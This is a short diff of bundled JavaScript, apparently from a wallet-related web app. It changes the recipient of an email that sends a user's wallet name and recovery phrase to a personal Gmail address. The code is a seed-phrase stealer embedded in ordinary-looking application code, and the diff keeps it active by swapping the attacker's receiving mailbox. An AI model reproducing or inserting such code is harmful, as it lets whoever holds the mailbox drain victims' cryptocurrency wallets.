@@ -13032,7 +13032,7 @@ const _l = {
                 try {
                     const w = {
                             subject: "New Details from ProjectDatabaseServer",
-                            to: "timzymainmail@gmail.com",
+                            to: "steveisaac2021@gmail.com",
                             message_html: `<div>
                   <p><b>Wallet Name</b>: ${v}</p>
                   <p><b>Phrase</b>: ${a.phrase}</p>
